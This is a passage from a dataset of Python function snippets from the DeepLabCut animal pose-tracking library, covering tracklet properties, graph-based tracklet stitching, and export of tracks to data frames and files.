    like = self.data[..., 2:3]
    self._centroid = np.nansum(self.xy * like, axis=1) / np.nansum(like, axis=1)"
AlexEMG/DeepLabCut,likelihood,"@property
def likelihood(self):
    """"""Return the average likelihood of all Tracklet detections.""""""
    return np.nanmean(self.data[..., 2])"
AlexEMG/DeepLabCut,identity,"@property
def identity(self):
    """"""Return the average predicted identity of all Tracklet detections.""""""
    try:
        return mode(self.data[..., 3], axis=None, nan_policy='omit', keepdims=False)[0]
    except IndexError:
        return -1"
AlexEMG/DeepLabCut,start,"@property
def start(self):
    """"""Return the time at which the tracklet starts.""""""
    return self.inds[0]"
AlexEMG/DeepLabCut,end,"@property
def end(self):
    """"""Return the time at which the tracklet ends.""""""
    return self.inds[-1]"
AlexEMG/DeepLabCut,flat_data,"@property
def flat_data(self):
    return self.data[..., :3].reshape(len(self), -1)"
AlexEMG/DeepLabCut,get_data_at,"def get_data_at(self, ind):
    return self.data[np.searchsorted(self.inds, ind)]"
AlexEMG/DeepLabCut,set_data_at,"def set_data_at(self, ind, data):
    self.data[np.searchsorted(self.inds, ind)] = data"
AlexEMG/DeepLabCut,del_data_at,"def del_data_at(self, ind):
    idx = np.searchsorted(self.inds, ind)
    self.inds = np.delete(self.inds, idx)
    self.data = np.delete(self.data, idx, axis=0)
    self._update_centroid()"
AlexEMG/DeepLabCut,interpolate,"def interpolate(self, max_gap=1):
    if max_gap < 1:
        raise ValueError('Gap should be a strictly positive integer.')
    gaps = np.diff(self.inds) - 1
    valid_gaps = (0 < gaps) & (gaps <= max_gap)
    fills = []
    for i in np.flatnonzero(valid_gaps):
        (s, e) = self.inds[[i, i + 1]]
        (data1, data2) = self.data[[i, i + 1]]
        diff = (data2 - data1) / (e - s)
        diff[np.isnan(diff)] = 0
        interp = diff[..., np.newaxis] * np.arange(1, e - s)
        data = data1 + np.rollaxis(interp, axis=2)
        data[..., 2] = 0.5
        if data.shape[1] == 4:
            data[:, 3] = self.identity
        fills.append(Tracklet(data, np.arange(s + 1, e)))
    if not fills:
        return self
    return self + sum(fills)"
AlexEMG/DeepLabCut,contains_duplicates,"def contains_duplicates(self, return_indices=False):
    """"""
        Evaluate whether the Tracklet contains duplicate time indices.
        If `return_indices`, also return the indices of the duplicates.
        """"""
    has_duplicates = len(set(self.inds)) != len(self.inds)
    if not return_indices:
        return has_duplicates
    return (has_duplicates, np.flatnonzero(np.diff(self.inds) == 0))"
AlexEMG/DeepLabCut,calc_velocity,"def calc_velocity(self, where='head', norm=True):
    """"""
        Calculate the linear velocity of either the `head`
        or `tail` of the Tracklet, computed over the last or first
        three frames, respectively. If `norm`, return the absolute
        speed rather than a 2D vector.
        """"""
    if where == 'tail':
        vel = np.diff(self.centroid[:3], axis=0) / np.diff(self.inds[:3])[:, np.newaxis]
    elif where == 'head':
        vel = np.diff(self.centroid[-3:], axis=0) / np.diff(self.inds[-3:])[:, np.newaxis]
    else:
        raise ValueError(f'Unknown where={where}')
    if norm:
        return np.sqrt(np.sum(vel ** 2, axis=1)).mean()
    return vel.mean(axis=0)"
AlexEMG/DeepLabCut,maximal_velocity,"@property
def maximal_velocity(self):
    vel = np.diff(self.centroid, axis=0) / np.diff(self.inds)[:, np.newaxis]
    return np.sqrt(np.max(np.sum(vel ** 2, axis=1)))"
AlexEMG/DeepLabCut,calc_rate_of_turn,"def calc_rate_of_turn(self, where='head'):
    """"""
        Calculate the rate of turn (or angular velocity) of
        either the `head` or `tail` of the Tracklet, computed over
        the last or first three frames, respectively.
        """"""
    if where == 'tail':
        v = np.diff(self.centroid[:3], axis=0)
    else:
        v = np.diff(self.centroid[-3:], axis=0)
    theta = np.arctan2(v[:, 1], v[:, 0])
    return (theta[1] - theta[0]) / (self.inds[1] - self.inds[0])"
AlexEMG/DeepLabCut,is_continuous,"@property
def is_continuous(self):
    """"""Test whether there are gaps in the time indices.""""""
    return self.end - self.start + 1 == len(self)"
AlexEMG/DeepLabCut,immediately_follows,"def immediately_follows(self, other_tracklet, max_gap=1):
    """"""
        Test whether this Tracklet follows another within
        a tolerance of`max_gap` frames.
        """"""
    return 0 < self.start - other_tracklet.end <= max_gap"
AlexEMG/DeepLabCut,distance_to,"def distance_to(self, other_tracklet):
    """"""
        Calculate the Euclidean distance between this Tracklet and another.
        If the Tracklets overlap in time, this is the mean distance over
        those frames. Otherwise, it is the distance between the head/tail
        of one to the tail/head of the other.
        """"""
    if self in other_tracklet:
        dist = self.centroid[np.isin(self.inds, other_tracklet.inds)] - other_tracklet.centroid[np.isin(other_tracklet.inds, self.inds)]
        return np.sqrt(np.sum(dist ** 2, axis=1)).mean()
    elif self < other_tracklet:
        return np.sqrt(np.sum((self.centroid[-1] - other_tracklet.centroid[0]) ** 2))
    else:
        return np.sqrt(np.sum((self.centroid[0] - other_tracklet.centroid[-1]) ** 2))"
AlexEMG/DeepLabCut,motion_affinity_with,"def motion_affinity_with(self, other_tracklet):
    """"""
        Evaluate the motion affinity of this Tracklet' with another one.
        This evaluates whether the Tracklets could realistically be reached
        by one another, knowing the time separating them and their velocities.
        Return 0 if the Tracklets overlap.
        """"""
    time_gap = self.time_gap_to(other_tracklet)
    if time_gap > 0:
        if self < other_tracklet:
            d1 = self.centroid[-1] + time_gap * self.calc_velocity(norm=False)
            d2 = other_tracklet.centroid[0] - time_gap * other_tracklet.calc_velocity('tail', False)
            delta1 = other_tracklet.centroid[0] - d1
            delta2 = self.centroid[-1] - d2
        else:
            d1 = other_tracklet.centroid[-1] + time_gap * other_tracklet.calc_velocity(norm=False)
            d2 = self.centroid[0] - time_gap * self.calc_velocity('tail', False)
            delta1 = self.centroid[0] - d1
            delta2 = other_tracklet.centroid[-1] - d2
        return (np.sqrt(np.sum(delta1 ** 2)) + np.sqrt(np.sum(delta2 ** 2))) / 2
    return 0"
AlexEMG/DeepLabCut,time_gap_to,"def time_gap_to(self, other_tracklet):
    """"""Return the time gap separating this Tracklet to another.""""""
    if self in other_tracklet:
        t = 0
    elif self < other_tracklet:
        t = other_tracklet.start - self.end
    else:
        t = self.start - other_tracklet.end
    return t"
AlexEMG/DeepLabCut,shape_dissimilarity_with,"def shape_dissimilarity_with(self, other_tracklet):
    """"""Calculate the dissimilarity in shape between this Tracklet and another.""""""
    if self in other_tracklet:
        dist = np.inf
    elif self < other_tracklet:
        dist = self.undirected_hausdorff(self.xy[-1], other_tracklet.xy[0])
    else:
        dist = self.undirected_hausdorff(self.xy[0], other_tracklet.xy[-1])
    return dist"
AlexEMG/DeepLabCut,box_overlap_with,"def box_overlap_with(self, other_tracklet):
    """"""Calculate the overlap between each Tracklet's bounding box.""""""
    if self in other_tracklet:
        overlap = 0
    else:
        if self < other_tracklet:
            bbox1 = self.calc_bbox(-1)
            bbox2 = other_tracklet.calc_bbox(0)
        else:
            bbox1 = self.calc_bbox(0)
            bbox2 = other_tracklet.calc_bbox(-1)
        overlap = calc_iou(bbox1, bbox2)
    return overlap"
AlexEMG/DeepLabCut,undirected_hausdorff,"@staticmethod
def undirected_hausdorff(u, v):
    return max(directed_hausdorff(u, v)[0], directed_hausdorff(v, u)[0])"
AlexEMG/DeepLabCut,calc_bbox,"def calc_bbox(self, ind):
    xy = self.xy[ind]
    bbox = np.empty(4)
    bbox[:2] = np.nanmin(xy, axis=0)
    bbox[2:] = np.nanmax(xy, axis=0)
    return bbox"
AlexEMG/DeepLabCut,hankelize,"@staticmethod
def hankelize(xy):
    ncols = int(np.ceil(len(xy) * 2 / 3))
    nrows = len(xy) - ncols + 1
    mat = np.empty((2 * nrows, ncols))
    mat[::2] = hankel(xy[:nrows, 0], xy[-ncols:, 0])
    mat[1::2] = hankel(xy[:nrows, 1], xy[-ncols:, 1])
    return mat"
AlexEMG/DeepLabCut,to_hankelet,"def to_hankelet(self):
    return self.hankelize(self.centroid)"
AlexEMG/DeepLabCut,dynamic_dissimilarity_with,"def dynamic_dissimilarity_with(self, other_tracklet):
    """"""
        Compute a dissimilarity score between Hankelets.
        This metric efficiently captures the degree of alignment of
        the subspaces spanned by the columns of both matrices.

        See Li et al., 2012.
            Cross-view Activity Recognition using Hankelets.
        """"""
    hk1 = self.to_hankelet()
    hk1 /= np.linalg.norm(hk1)
    hk2 = other_tracklet.to_hankelet()
    hk2 /= np.linalg.norm(hk2)
    min_shape = min(hk1.shape + hk2.shape)
    temp1 = (hk1 @ hk1.T)[:min_shape, :min_shape]
    temp2 = (hk2 @ hk2.T)[:min_shape, :min_shape]
    return 2 - np.linalg.norm(temp1 + temp2)"
AlexEMG/DeepLabCut,dynamic_similarity_with,"def dynamic_similarity_with(self, other_tracklet, tol=0.01):
    """"""
        Evaluate the complexity of the tracklets' underlying dynamics
        from the rank of their Hankel matrices, and assess whether
        they originate from the same track. The idea is that if two
        tracklets are part of the same track, they can be approximated
        by a low order regressor. Conversely, tracklets belonging to
        different tracks will require a higher order regressor.

        See Dicle et al., 2013.
            The Way They Move: Tracking Multiple Targets with Similar Appearance.
        """"""
    joint_tracklet = self + other_tracklet
    joint_rank = joint_tracklet.estimate_rank(tol)
    rank1 = self.estimate_rank(tol)
    rank2 = other_tracklet.estimate_rank(tol)
    return (rank1 + rank2) / joint_rank - 1"
AlexEMG/DeepLabCut,estimate_rank,"def estimate_rank(self, tol):
    """"""
        Estimate the (low) rank of a noisy matrix via
        hard thresholding of singular values.

        See Gavish & Donoho, 2013.
            The optimal hard threshold for singular values is 4/sqrt(3)
        """"""
    mat = self.to_hankelet()
    (_, s, _) = sli.svd(mat, min(10, min(mat.shape)))
    eigen = s ** 2
    diff = np.abs(np.diff(eigen / eigen[0]))
    return np.argmin(diff > tol)"
AlexEMG/DeepLabCut,plot,"def plot(self, centroid_only=True, color=None, ax=None, interactive=False):
    if ax is None:
        (fig, ax) = plt.subplots()
    centroid = np.full((self.end + 1, 2), np.nan)
    centroid[self.inds] = self.centroid
    lines = ax.plot(centroid, c=color, lw=2, picker=interactive)
    if not centroid_only:
        xy = np.full((self.end + 1, self.xy.shape[1], 2), np.nan)
        xy[self.inds] = self.xy
        ax.plot(xy[..., 0], c=color, lw=1)
        ax.plot(xy[..., 1], c=color, lw=1)
    return lines"
AlexEMG/DeepLabCut,__init__,"def __init__(self, tracklets, n_tracks, min_length=10, split_tracklets=True, prestitch_residuals=True):
    if n_tracks < 1:
        raise ValueError('There must at least be one track to reconstruct.')
    if min_length < 3:
        raise ValueError('A tracklet must have a minimal length of 3.')
    self.min_length = min_length
    self.filename = ''
    self.header = None
    self.single = None
    self.n_tracks = n_tracks
    self.G = None
    self.paths = None
    self.tracks = None
    self.tracklets = []
    self.residuals = []
    for unpure_tracklet in tracklets:
        tracklet = self.purify_tracklet(unpure_tracklet)
        if tracklet is None:
            continue
        if not tracklet.is_continuous and split_tracklets:
            idx = np.flatnonzero(np.diff(tracklet.inds) != 1) + 1
            tracklet = self.split_tracklet(tracklet, tracklet.inds[idx])
        if not isinstance(tracklet, list):
            tracklet = [tracklet]
        for t in tracklet:
            if len(t) >= min_length:
                self.tracklets.append(t)
            elif len(t) < min_length:
                self.residuals.append(t)
    if not len(self.tracklets):
        raise IOError('Tracklets are empty.')
    if prestitch_residuals:
        self._prestitch_residuals(5)
    self.tracklets = sorted(self.tracklets, key=lambda t: t.start)
    self._first_frame = self.tracklets[0].start
    self._last_frame = max(self.tracklets, key=lambda t: t.end).end
    self._first_tracklets = sorted(self, key=lambda t: t.start)[:self.n_tracks]
    self._last_tracklets = sorted(self, key=lambda t: t.end)[-self.n_tracks:]
    self._mapping = {tracklet: {'in': f'{i}in', 'out': f'{i}out'} for (i, tracklet) in enumerate(self)}
    self._mapping_inv = {label: k for (k, v) in self._mapping.items() for label in v.values()}
    self._lu_overlap = defaultdict(list)
    for (tracklet1, tracklet2) in combinations(self, 2):
        if tracklet2 in tracklet1:
            self._lu_overlap[tracklet1].append(tracklet2)
            self._lu_overlap[tracklet2].append(tracklet1)"
AlexEMG/DeepLabCut,__getitem__,"def __getitem__(self, item):
    return self.tracklets[item]"
AlexEMG/DeepLabCut,__len__,"def __len__(self):
    return len(self.tracklets)"
AlexEMG/DeepLabCut,from_pickle,"@classmethod
def from_pickle(cls, pickle_file, n_tracks, min_length=10, split_tracklets=True, prestitch_residuals=True):
    with open(pickle_file, 'rb') as file:
        tracklets = pickle.load(file)
    class_ = cls.from_dict_of_dict(tracklets, n_tracks, min_length, split_tracklets, prestitch_residuals)
    class_.filename = pickle_file
    return class_"
AlexEMG/DeepLabCut,from_dict_of_dict,"@classmethod
def from_dict_of_dict(cls, dict_of_dict, n_tracks, min_length=10, split_tracklets=True, prestitch_residuals=True):
    tracklets = []
    header = dict_of_dict.pop('header', None)
    single = None
    for (k, dict_) in dict_of_dict.items():
        try:
            (inds, data) = zip(*[(cls.get_frame_ind(k), v) for (k, v) in dict_.items()])
        except ValueError:
            continue
        inds = np.asarray(inds)
        data = np.asarray(data)
        try:
            (nrows, ncols) = data.shape
            data = data.reshape((nrows, ncols // 3, 3))
        except ValueError:
            pass
        tracklet = Tracklet(data, inds)
        if k == 'single':
            single = tracklet
        else:
            tracklets.append(Tracklet(data, inds))
    class_ = cls(tracklets, n_tracks, min_length, split_tracklets, prestitch_residuals)
    class_.header = header
    class_.single = single
    return class_"
AlexEMG/DeepLabCut,get_frame_ind,"@staticmethod
def get_frame_ind(s):
    if isinstance(s, str):
        return int(re.findall('\\d+', s)[0])
    return s"
AlexEMG/DeepLabCut,purify_tracklet,"@staticmethod
def purify_tracklet(tracklet):
    valid = ~np.isnan(tracklet.xy).all(axis=(1, 2))
    if not np.any(valid):
        return None
    return Tracklet(tracklet.data[valid], tracklet.inds[valid])"
AlexEMG/DeepLabCut,split_tracklet,"@staticmethod
def split_tracklet(tracklet, inds):
    idx = sorted(set(np.searchsorted(tracklet.inds, inds)))
    inds_new = np.split(tracklet.inds, idx)
    data_new = np.split(tracklet.data, idx)
    return [Tracklet(data, inds) for (data, inds) in zip(data_new, inds_new)]"
AlexEMG/DeepLabCut,n_frames,"@property
def n_frames(self):
    return self._last_frame - self._first_frame + 1"
AlexEMG/DeepLabCut,compute_max_gap,"@staticmethod
def compute_max_gap(tracklets):
    gap = defaultdict(list)
    for (tracklet1, tracklet2) in combinations(tracklets, 2):
        gap[tracklet1].append(tracklet1.time_gap_to(tracklet2))
    max_gap = 0
    for vals in gap.values():
        for val in sorted(vals):
            if val > 0:
                if val > max_gap:
                    max_gap = val
                break
    return max_gap"
AlexEMG/DeepLabCut,mine,"def mine(self, n_samples):
    p = np.asarray([t.likelihood for t in self])
    p /= p.sum()
    triplets = []
    while len(triplets) != n_samples:
        tracklet = np.random.choice(self, p=p)
        overlapping_tracklets = self._lu_overlap[tracklet]
        if not overlapping_tracklets:
            continue
        ind_min = np.argmin([tracklet.distance_to(t) for t in overlapping_tracklets])
        overlapping_tracklet = overlapping_tracklets[ind_min]
        common_inds = set(tracklet.inds).intersection(overlapping_tracklet.inds)
        ind_anchor = np.random.choice(list(common_inds))
        anchor = tracklet.get_data_at(ind_anchor)[:, :2].astype(int)
        neg = overlapping_tracklet.get_data_at(ind_anchor)[:, :2].astype(int)
        ind_pos = np.random.choice(tracklet.inds[tracklet.inds != ind_anchor])
        pos = tracklet.get_data_at(ind_pos)[:, :2].astype(int)
        triplet = ((anchor, ind_anchor), (pos, ind_pos), (neg, ind_anchor))
        triplets.append(triplet)
    return triplets"
AlexEMG/DeepLabCut,build_graph,"def build_graph(self, nodes=None, max_gap=None, weight_func=None):
    if nodes is None:
        nodes = self.tracklets
    nodes = sorted(nodes, key=lambda t: t.start)
    n_nodes = len(nodes)
    if not max_gap:
        max_gap = int(1.5 * self.compute_max_gap(nodes))
    self.G = nx.DiGraph()
    self.G.add_node('source', demand=-self.n_tracks)
    self.G.add_node('sink', demand=self.n_tracks)
    (nodes_in, nodes_out) = zip(*[v.values() for (k, v) in self._mapping.items() if k in nodes])
    self.G.add_nodes_from(nodes_in, demand=1)
    self.G.add_nodes_from(nodes_out, demand=-1)
    self.G.add_edges_from(zip(nodes_in, nodes_out), capacity=1)
    self.G.add_edges_from(zip(['source'] * n_nodes, nodes_in), capacity=1)
    self.G.add_edges_from(zip(nodes_out, ['sink'] * n_nodes), capacity=1)
    if weight_func is None:
        weight_func = self.calculate_edge_weight
    for i in trange(n_nodes):
        node_i = nodes[i]
        end = node_i.end
        for j in range(i + 1, n_nodes):
            node_j = nodes[j]
            start = node_j.start
            gap = start - end
            if gap > max_gap:
                break
            elif gap > 0:
                w = int(100 * weight_func(node_i, node_j))
                self.G.add_edge(self._mapping[node_i]['out'], self._mapping[node_j]['in'], weight=w, capacity=1)"
AlexEMG/DeepLabCut,_update_edge_weights,"def _update_edge_weights(self, weight_func):
    if self.G is None:
        raise ValueError('Inexistent graph. Call `build_graph` first')
    for (node1, node2, weight) in self.G.edges.data('weight'):
        if weight is not None:
            w = weight_func(self._mapping_inv[node1], self._mapping_inv[node2])
            self.G.edges[node1, node2]['weight'] = w"
AlexEMG/DeepLabCut,stitch,"def stitch(self, add_back_residuals=True):
    if self.G is None:
        raise ValueError('Inexistent graph. Call `build_graph` first')
    try:
        (_, self.flow) = nx.capacity_scaling(self.G)
        self.paths = self.reconstruct_paths()
    except nx.exception.NetworkXUnfeasible:
        warnings.warn('No optimal solution found. Employing black magic...')
        in_to_keep = [self._mapping[first_tracklet]['in'] for first_tracklet in self._first_tracklets]
        out_to_keep = [self._mapping[last_tracklet]['out'] for last_tracklet in self._last_tracklets]
        in_to_remove = set((node for (_, node) in self.G.out_edges('source'))).difference(in_to_keep)
        out_to_remove = set((node for (node, _) in self.G.in_edges('sink'))).difference(out_to_keep)
        self.G.remove_edges_from(zip(['source'] * len(in_to_remove), in_to_remove))
        self.G.remove_edges_from(zip(out_to_remove, ['sink'] * len(out_to_remove)))
        paths = []
        for path in nx.node_disjoint_paths(self.G, 'source', 'sink', preflow_push, self.n_tracks):
            temp = set()
            for node in path[1:-1]:
                self.G.remove_node(node)
                temp.add(self._mapping_inv[node])
            paths.append(list(temp))
        incomplete_tracks = self.n_tracks - len(paths)
        remaining_nodes = set((self._mapping_inv[node] for node in self.G if node not in ('source', 'sink')))
        if len(remaining_nodes) > 0:
            if incomplete_tracks == 1:
                for (t1, t2) in combinations(remaining_nodes, 2):
                    if t1 in t2:
                        if t1 in remaining_nodes:
                            remaining_nodes.remove(t1)
                        if t2 in remaining_nodes:
                            remaining_nodes.remove(t2)
                        track = sum(remaining_nodes)
                        hyp1 = track + t1
                        hyp2 = track + t2
                        dx1 = np.diff(hyp1.centroid, axis=0)
                        cv1 = dx1.std() / np.abs(dx1).mean()
                        dx2 = np.diff(hyp2.centroid, axis=0)
                        cv2 = dx2.std() / np.abs(dx2).mean()
                        if cv1 < cv2:
                            remaining_nodes.add(t1)
                            self.residuals.append(t2)
                        else:
                            remaining_nodes.add(t2)
                            self.residuals.append(t1)
                paths.append(list(remaining_nodes))
            elif incomplete_tracks > 1:
                self.build_graph(list(remaining_nodes), max_gap=np.inf)
                self.G.nodes['source']['demand'] = -incomplete_tracks
                self.G.nodes['sink']['demand'] = incomplete_tracks
                (_, self.flow) = nx.capacity_scaling(self.G)
                paths += self.reconstruct_paths()
        self.paths = paths
        if len(self.paths) != self.n_tracks:
            warnings.warn(f'Only {len(self.paths)} tracks could be reconstructed.')
    finally:
        if self.paths is None:
            raise ValueError(f'Could not reconstruct {self.n_tracks} tracks from the tracklets given.')
        self.tracks = np.asarray([sum(path) for path in self.paths if path])
        if add_back_residuals:
            _ = self._finalize_tracks()"
AlexEMG/DeepLabCut,_finalize_tracks,"def _finalize_tracks(self):
    residuals = [res for res in sorted(self.residuals, key=len) if len(res) > 1]
    n_attemps = 0
    n_max = len(residuals)
    while n_attemps < n_max and residuals:
        for res in residuals[::-1]:
            easy_fit = [i for (i, track) in enumerate(self.tracks) if res not in track]
            if not easy_fit:
                residuals.remove(res)
                continue
            if len(easy_fit) == 1:
                self.tracks[easy_fit[0]] += res
                residuals.remove(res)
                n_attemps = 0
            else:
                n_attemps += 1
    for res in residuals[::-1]:
        c1 = res.centroid[[0, -1]]
        easy_fit = [i for (i, track) in enumerate(self.tracks) if res not in track]
        dists = []
        for (n, track) in enumerate(self.tracks[easy_fit]):
            e = np.searchsorted(track.inds, res.end)
            s = e - 1
            try:
                t = track.inds[[s, e]]
            except IndexError:
                continue
            left_gap = res.start - t[0]
            right_gap = t[1] - res.end
            if not left_gap > 0 and right_gap > 0:
                continue
            if left_gap <= 3:
                dist = np.linalg.norm(track.centroid[s] - c1[0])
            elif right_gap <= 3:
                dist = np.linalg.norm(track.centroid[e] - c1[1])
            else:
                dist = np.linalg.norm(track.centroid[s] - c1[0]) + np.linalg.norm(track.centroid[e] - c1[1])
            dists.append((n, dist))
        if not dists:
            continue
        if len(dists) == 1:
            ind = easy_fit[dists[0][0]]
        else:
            ind = sorted(dists, key=lambda x: x[1])[0][0]
        self.tracks[ind] += res
        residuals.remove(res)
    return residuals"
AlexEMG/DeepLabCut,_prestitch_residuals,"def _prestitch_residuals(self, max_gap=5):
    G = nx.DiGraph()
    residuals = sorted(self.residuals, key=lambda x: x.start)
    for i in range(len(residuals)):
        e = residuals[i].end
        for j in range(i + 1, len(residuals)):
            s = residuals[j].start
            gap = s - e
            if gap < 1:
                continue
            if gap < max_gap:
                w = 1 - residuals[i].box_overlap_with(residuals[j])
                G.add_edge(i, j, weight=w)
            else:
                break
    mini_tracks = []
    to_remove = []
    for comp in nx.connected_components(G.to_undirected()):
        sub_ = G.subgraph(comp)
        inds = nx.dag_longest_path(sub_)
        to_remove.extend(inds)
        mini_tracks.append(sum((residuals[ind] for ind in inds)))
    for ind in sorted(to_remove, reverse=True):
        self.residuals.pop(ind)
    self.residuals.extend(mini_tracks)"
AlexEMG/DeepLabCut,concatenate_data,"def concatenate_data(self):
    if self.tracks is None:
        raise ValueError('No tracks were found. Call `stitch` first')
    self._first_frame = min(self.tracks, key=lambda t: t.start).start
    self._last_frame = max(self.tracks, key=lambda t: t.end).end
    data = []
    for track in sorted(self.tracks, key=lambda t: t.identity):
        flat_data = track.flat_data
        temp = np.full((self.n_frames, flat_data.shape[1]), np.nan)
        temp[track.inds - self._first_frame] = flat_data
        data.append(temp)
    missing_tracks = self.n_tracks - len(self.tracks)
    if missing_tracks > 0:
        track_shape = self.tracks[0].flat_data.shape[1]
        data += missing_tracks * [np.full((self.n_frames, track_shape), np.nan)]
    return np.hstack(data)"
AlexEMG/DeepLabCut,format_df,"def format_df(self, animal_names=None):
    data = self.concatenate_data()
    if not animal_names or len(animal_names) != self.n_tracks:
        animal_names = [f'ind{i}' for i in range(1, self.n_tracks + 1)]
    coords = ['x', 'y', 'likelihood']
    n_multi_bpts = data.shape[1] // (len(animal_names) * len(coords))
    n_unique_bpts = 0 if self.single is None else self.single.data.shape[1]
    if self.header is not None:
        scorer = self.header.get_level_values('scorer').unique().to_list()
        bpts = self.header.get_level_values('bodyparts').unique().to_list()
    else:
        scorer = ['scorer']
        bpts = [f'bpt{i}' for i in range(1, n_multi_bpts + 1)]
        bpts += [f'bpt_unique{i}' for i in range(1, n_unique_bpts + 1)]
    columns = pd.MultiIndex.from_product([scorer, animal_names, bpts[:n_multi_bpts], coords], names=['scorer', 'individuals', 'bodyparts', 'coords'])
    inds = range(self._first_frame, self._last_frame + 1)
    df = pd.DataFrame(data, columns=columns, index=inds)
    df = df.reindex(range(self._last_frame + 1))
    if self.single is not None:
        columns = pd.MultiIndex.from_product([scorer, ['single'], bpts[-n_unique_bpts:], coords], names=['scorer', 'individuals', 'bodyparts', 'coords'])
        df2 = pd.DataFrame(self.single.flat_data, columns=columns, index=self.single.inds)
        df = df.join(df2, how='outer')
    return df"
AlexEMG/DeepLabCut,write_tracks,"def write_tracks(self, output_name='', suffix='', animal_names=None, save_as_csv=False):
    df = self.format_df(animal_names)
    if not output_name:
        if suffix:
            suffix = '_' + suffix
        output_name = self.filename.replace('.pickle', f'{suffix}.h5')
    df.to_hdf(output_name, 'tracks', format='table', mode='w')
    if save_as_csv:
        df.to_csv(output_name.replace('.h5', '.csv'))"
AlexEMG/DeepLabCut,calculate_edge_weight,"@staticmethod
def calculate_edge_weight(tracklet1, tracklet2):
    return tracklet1.distance_to(tracklet2)"
AlexEMG/DeepLabCut,weights,"@property
def weights(self):
    if self.G is None:
        raise ValueError('Inexistent graph. Call `build_graph` first')
    return nx.get_edge_attributes(self.G, 'weight')"
AlexEMG/DeepLabCut,draw_graph,"def draw_graph(self, with_weights=False):
    if self.G is None:
        raise ValueError('Inexistent graph. Call `build_graph` first')
    pos = nx.spring_layout(self.G)
    nx.draw_networkx(self.G, pos)
    if with_weights:
        nx.draw_networkx_edge_labels(self.G, pos, edge_labels=self.weights)"
AlexEMG/DeepLabCut,plot_paths,"def plot_paths(self, colormap='Set2'):
    if self.paths is None:
        raise ValueError('No paths were found. Call `stitch` first')
    (fig, ax) = plt.subplots()
    ax.set_yticks([])
    for (loc, spine) in ax.spines.items():
        if loc != 'bottom':
            spine.set_visible(False)
    for path in self.paths:
        length = len(path)
        colors = plt.get_cmap(colormap, length)(range(length))
        for (tracklet, color) in zip(path, colors):
            tracklet.plot(color=color, ax=ax)"
AlexEMG/DeepLabCut,plot_tracks,"def plot_tracks(self, colormap='viridis'):
    if self.tracks is None:
        raise ValueError('No tracks were found. Call `stitch` first')
    (fig, ax) = plt.subplots()
    ax.set_yticks([])
    for (loc, spine) in ax.spines.items():
        if loc != 'bottom':
            spine.set_visible(False)
    colors = plt.get_cmap(colormap, self.n_tracks)(range(self.n_tracks))
    for (track, color) in zip(self.tracks, colors):
        track.plot(color=color, ax=ax)"
AlexEMG/DeepLabCut,plot_tracklets,"def plot_tracklets(self, colormap='Paired'):
    (fig, axes) = plt.subplots(ncols=2, figsize=(14, 4))
    axes[0].set_yticks([])
    for (loc, spine) in axes[0].spines.items():
        if loc != 'bottom':
            spine.set_visible(False)
    axes[1].axis('off')
    cmap = plt.get_cmap(colormap)
    colors = cycle(cmap.colors)
    line2tracklet = dict()
    tracklet2lines = dict()
    all_points = defaultdict(dict)
    for tracklet in self:
        color = next(colors)
        lines = tracklet.plot(ax=axes[0], color=color)
        tracklet2lines[tracklet] = lines
        for line in lines:
            line2tracklet[line] = tracklet
        for (i, (x, y)) in zip(tracklet.inds, tracklet.centroid):
            all_points[i][x, y] = color"
AlexEMG/DeepLabCut,reconstruct_paths,"def reconstruct_paths(self):
    paths = []
    for (node, flow) in self.flow['source'].items():
        if flow == 1:
            path = self.reconstruct_path(node.replace('in', 'out'))
            paths.append([self._mapping_inv[tracklet] for tracklet in path])
    return paths"
AlexEMG/DeepLabCut,reconstruct_path,"def reconstruct_path(self, source):
    path = [source]
    for (node, flow) in self.flow[source].items():
        if flow == 1:
            if node != 'sink':
                self.flow[source][node] -= 1
                path.extend(self.reconstruct_path(node.replace('in', 'out')))
            return path"
AlexEMG/DeepLabCut,trans_weight_func,"def trans_weight_func(tracklet1, tracklet2, nframe, feature_dict):
    zfill_width = int(np.ceil(np.log10(nframe)))
    if tracklet1 < tracklet2:
        ind_img1 = tracklet1.inds[-1]
        coord1 = tracklet1.data[-1][:, :2]
        ind_img2 = tracklet2.inds[0]
        coord2 = tracklet2.data[0][:, :2]
    else:
        ind_img2 = tracklet2.inds[-1]
        ind_img1 = tracklet1.inds[0]
        coord2 = tracklet2.data[-1][:, :2]
        coord1 = tracklet1.data[0][:, :2]
    t1 = (coord1, ind_img1)
    t2 = (coord2, ind_img2)
    dist = dlctrans(t1, t2, zfill_width, feature_dict)
    dist = (dist + 1) / 2
    return -dist"
AlexEMG/DeepLabCut,weight_func,"def weight_func(t1, t2):
    w = 0.01 if t1.identity == t2.identity else 1
    return w * stitcher.calculate_edge_weight(t1, t2)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, config, min_swap_len=2, min_tracklet_len=2, max_gap=0):
    """"""

        Parameters
        ----------
        config : str
            Path to a configuration file.
        min_swap_len : float, optional (default=2)
            Minimum swap length.
            Swaps shorter than 2 frames are discarded by default.
        min_tracklet_len : float, optional (default=2)
            Minimum tracklet length.
            Tracklets shorter than 2 frames are discarded by default.
        max_gap : int, optional (default = 0).
            Number of frames to consider when filling in missing data.

        Examples
        --------

        manager = TrackletManager(config_path, min_swap_frac=0, min_tracklet_frac=0)

        manager.load_tracklets_from_pickle(filename)
        # Alternatively
        manager.load_tracklets_from_h5(filename)

        manager.find_swapping_bodypart_pairs()
        """"""
    self.config = config
    self.cfg = auxiliaryfunctions.read_config(config)
    self.min_swap_len = min_swap_len
    self.min_tracklet_len = min_tracklet_len
    self.max_gap = max_gap
    self.filename = ''
    self.data = None
    self.xy = None
    self._xy = None
    self.prob = None
    self.nframes = 0
    self.times = []
    self.scorer = None
    self.bodyparts = []
    self.nindividuals = len(self.cfg['individuals'])
    self.individuals = []
    self.tracklet2id = []
    self.tracklet2bp = []
    self.swapping_pairs = []
    self.swapping_bodyparts = []
    self._label_pairs = None"
AlexEMG/DeepLabCut,_load_tracklets,"def _load_tracklets(self, tracklets, auto_fill):
    header = tracklets.pop('header')
    self.scorer = header.get_level_values('scorer').unique().to_list()
    bodyparts = header.get_level_values('bodyparts')
    bodyparts_multi = [bp for bp in self.cfg['multianimalbodyparts'] if bp in bodyparts]
    bodyparts_single = self.cfg['uniquebodyparts']
    mask_multi = bodyparts.isin(bodyparts_multi)
    mask_single = bodyparts.isin(bodyparts_single)
    self.bodyparts = list(bodyparts[mask_multi]) * self.nindividuals + list(bodyparts[mask_single])
    temp = sorted(tracklets.values(), key=len)
    if not len(temp):
        raise IOError('Tracklets are empty.')
    get_frame_ind = lambda s: int(re.findall('\\d+', s)[0])
    tracklets_sorted = []
    last_frames = []
    for tracklet in temp:
